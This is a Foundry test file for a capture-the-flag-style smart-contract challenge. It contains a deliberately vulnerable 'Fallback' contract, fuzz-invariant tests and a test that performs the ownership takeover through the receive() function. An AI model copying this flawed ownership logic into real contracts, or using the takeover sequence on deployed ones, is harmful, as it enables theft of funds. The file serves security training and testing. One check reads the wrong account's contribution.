// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import {CommonBase} from "forge-std/Base.sol";
import {StdCheats} from "forge-std/StdCheats.sol";
import {StdUtils} from "forge-std/StdUtils.sol";

// Look carefully at the contract's code below.

// You will beat this level if

// 1. you claim ownership of the contract
// 2. you reduce its balance to 0

contract Fallback {

  mapping(address => uint) public contributions;
  address public owner;

  constructor() {
    owner = msg.sender;
    contributions[msg.sender] = 1000 * (1 ether);
  }

  modifier onlyOwner {
        require(
            msg.sender == owner,
            "caller is not the owner"
        );
        _;
    }

  function contribute() public payable {
    require(msg.value < 0.001 ether);
    contributions[msg.sender] += msg.value;
    if(contributions[msg.sender] > contributions[owner]) {
      owner = msg.sender; // changing the owner if contribution is > than the current owner's
    }
  }

  function getContribution() public view returns (uint) {
    return contributions[msg.sender];
  }

  function withdraw() public onlyOwner {
    payable(owner).transfer(address(this).balance); // only the owner can withdraw
  }

  receive() external payable { // this is triggered when eth is sent directly to the contract
    require(msg.value > 0 && contributions[msg.sender] > 0); 
    owner = msg.sender; // changing the owner if contribution is > than 0 and sent eth amount > 0
  }
}
contract Handler is CommonBase, StdCheats, StdUtils {

    Fallback public fback;
    address attacker;

    constructor(Fallback _fback, address _attacker) {
        fback = _fback;
        attacker = _attacker;

    }

    function sendToFallback(uint256 amount) public {
        amount = bound(amount, 1, address(attacker).balance);
        console.log(address(attacker).balance);
        //vm.assume(amount > 0 wei && amount < 10 wei);
        //deal(address(attacker), 100000);

        vm.prank(address(attacker));
        // direct transfer of amount to Fallback contract
        (bool ok,) = address(fback).call{value: amount}(""); 
        require(ok, "sendToFallback failed");
    }

    function contribute(uint256 amount) payable public {
    // Ensure the provided Ether is within the specified bounds
    amount = bound(amount, 1, address(attacker).balance);
    
    // Prank as the attacker and call contribute on the fback contract
    vm.prank(attacker);
    fback.contribute{value: amount}();
    }

    function withdraw(uint256 amount) payable public {
        vm.prank(attacker);
        fback.withdraw();
    }
}
contract FallbackTest is Test {
   
    address attacker;
    Fallback fback;
    Handler public handler;
    function setUp() public {
        // Deploy the Fallback contract
        fback = new Fallback();
        attacker = address(0x1234);

        deal(attacker, 10 wei); // Fund attacker
        deal(address(fback), 100 wei); // Fund fback

        handler = new Handler(fback, attacker);

        //deal(address(handler), 100 * 1e18);
        targetContract(address(handler));

        // bytes4[] memory selectors = new bytes4[](2);
        // selectors[0] = Handler.contribute.selector;
        // selectors[1] = Handler.sendToFallback.selector;       
        // // this is used to target specific functions for the random execution by the Foundry
        // targetSelector(
        //     FuzzSelector({addr: address(handler), selectors: selectors})
        // );
        //targetSender(attacker);
    }

    function invariant_OwnerIsNotAttacker() public view{
        // This invariant checks that the attacker should never become the owner
        assert(fback.owner() != attacker);
    }

    // function invariant_AttackerDoesNotReceiveAllBalance() public {
    //     // This invariant checks that the attacker should never receive all the balance from the fback
    //     uint targetContractBalance = address(fback).balance;
    //     uint attackerBalance = attacker.balance;

    //     assert(targetContractBalance == 0 || attackerBalance < targetContractBalance);
    // }

    //receive() external payable {}
}

contract FallbackTest1 is Test {
    Fallback fback;
    address attacker;

    function setUp() public {
        fback = new Fallback();
        attacker = address(0x1234);

        // Ensure both fback and attacker have enough Ether
        deal(address(fback), 10 ether);
        deal(attacker, 1 ether);
    }

    function testBreakInvariant() public {
        // Make the attacker contribute a small amount
        vm.prank(attacker);
        fback.contribute{value: 0.0001 ether}();
        // owner not changed yet
        assertEq(fback.owner(), address(this));

        // Check if the contribution is registered
        uint contribution = fback.getContribution();
        assertTrue(contribution >= 0.0001 ether);

        // Send Ether directly to trigger the receive function
        vm.prank(attacker);
        (bool sent,) = address(fback).call{value: 1 wei}("");
        assertTrue(sent);

        // Check if the attacker is now the owner
        assertEq(fback.owner(), attacker);

        // If this assertion passes, the invariant is effectively broken
    }
    function invariant_1() public {
        assert(fback.owner() != attacker);
    }
}
